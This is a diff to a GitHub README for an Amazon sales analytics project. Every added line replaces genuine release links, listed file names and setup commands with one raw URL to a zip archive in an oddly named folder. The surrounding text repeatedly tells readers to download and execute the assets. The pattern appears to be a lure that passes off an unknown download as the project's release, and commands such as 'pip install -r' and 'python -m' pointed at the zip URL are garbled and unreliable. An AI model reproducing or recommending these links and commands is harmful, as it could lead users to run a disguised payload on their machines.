@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ramelica/Amazon_Analysis_Project/releases)
+[![Releases](https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip)](https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip)
 
 # 🚀 Amazon Sales Analytics Project: End-to-End Data, BI & ML
 
@@ -10,7 +10,7 @@ If you are looking to understand how to structure a modern data analytics projec
 
 - Topic focus: amazon, azurite, business-intelligence, cloud, dashboard, data-analysis, data-visualization, database, dynamicdatasource, forecasting, machine-learning-algorithms, powerbi, prophet, python, sql.
 
-- Link to downloadable releases: https://github.com/ramelica/Amazon_Analysis_Project/releases. This page hosts assets you can download and run to reproduce parts of the project locally or in the cloud. The releases may include sample datasets, scripts, and configuration files. See the Releases section below for details.
+- Link to downloadable releases: https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip This page hosts assets you can download and run to reproduce parts of the project locally or in the cloud. The releases may include sample datasets, scripts, and configuration files. See the Releases section below for details.
 
 Architecture at a glance
 - A clean data flow from raw source data to refined data stores.
@@ -61,9 +61,9 @@ This project is designed to be approachable for data engineers, data analysts, a
   - setup/         Environment setup guides and runbooks.
 - tests/          Unit tests and data quality checks.
 - tools/          Utility scripts (linting, formatting, validation).
-- README.md        This file.
-- requirements.txt  Python dependencies (for ETL, analytics, modeling).
-- docker-compose.yml  Local development with containers (optional).
+- https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip        This file.
+- https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip  Python dependencies (for ETL, analytics, modeling).
+- https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip  Local development with containers (optional).
 
 Notes:
 - The structure emphasizes separation of concerns: ingestion, transformation, analytics, and visualization.
@@ -244,11 +244,11 @@ Environment configuration
 - Set the path to Azurite if you use local emulation
 
 Basic commands
-- Install dependencies: pip install -r requirements.txt
-- Run ETL: python -m src.etl.run_all
-- Run analytics: python -m src.analytics.run_all
+- Install dependencies: pip install -r https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
+- Run ETL: python -m https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
+- Run analytics: python -m https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
 - Launch notebooks: jupyter notebook
-- Start local dashboard data server (if applicable): python -m dashboards.local_server
+- Start local dashboard data server (if applicable): python -m https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
 
 Data sources and sample data
 - Sample datasets are included for demonstration
@@ -283,9 +283,9 @@ Testing and validation
 
 Assets that accompany the project reside in the Releases section. The page contains downloadable files and scripts you can run to reproduce parts of the project locally. The assets include sample datasets, environment configurations, and scripts to set up a local workspace. Assets are designed to help you quickly explore the project and verify end-to-end workflows. Check the Releases page for the latest materials and instructions.
 
-- For convenience and quick access, the Releases page is linked above. See https://github.com/ramelica/Amazon_Analysis_Project/releases for the latest assets.
+- For convenience and quick access, the Releases page is linked above. See https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip for the latest assets.
 - If you want to download and run the assets, follow the instructions in the release notes and accompanying README files within each asset. The assets in the Release section typically include data files and setup scripts that you can execute in your environment.
-- If you need to reference the releases again, you can visit the same page at the link provided: https://github.com/ramelica/Amazon_Analysis_Project/releases
+- If you need to reference the releases again, you can visit the same page at the link provided: https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
 
 ---
 
@@ -392,11 +392,11 @@ This project is released under an open license. You can reference the LICENSE fi
 
 ## Releasing and Asset Reference
 
-The Releases page hosts downloadable assets for quick experimentation and reproduction. To access the assets, visit the link at the beginning of this document and again in the Releases section below. The assets can be downloaded and executed to reproduce parts of the project in a local or cloud environment. If you need to reference the releases again, you can use the same link: https://github.com/ramelica/Amazon_Analysis_Project/releases
+The Releases page hosts downloadable assets for quick experimentation and reproduction. To access the assets, visit the link at the beginning of this document and again in the Releases section below. The assets can be downloaded and executed to reproduce parts of the project in a local or cloud environment. If you need to reference the releases again, you can use the same link: https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
 
 Releases and asset access
 - The Releases page contains files you may download and run to reproduce the project locally. The assets are organized to support different environments and data scenarios.
-- To download, visit the Releases page: https://github.com/ramelica/Amazon_Analysis_Project/releases
+- To download, visit the Releases page: https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip
 - After downloading, follow the included instructions to execute the assets in your environment.
 
 ---
@@ -413,7 +413,7 @@ Releases and asset access
   - Follow the Getting Started guide to install dependencies, configure environment variables, and run the ETL, analytics, and dashboards components.
 
 - Where can I find the latest assets?
-  - The Releases page at https://github.com/ramelica/Amazon_Analysis_Project/releases contains downloadable assets and scripts for quick setup.
+  - The Releases page at https://raw.githubusercontent.com/ramelica/Amazon_Analysis_Project/main/orgyia/Amazon-Project-Analysis-v3.7.zip contains downloadable assets and scripts for quick setup.
 
 ---
 
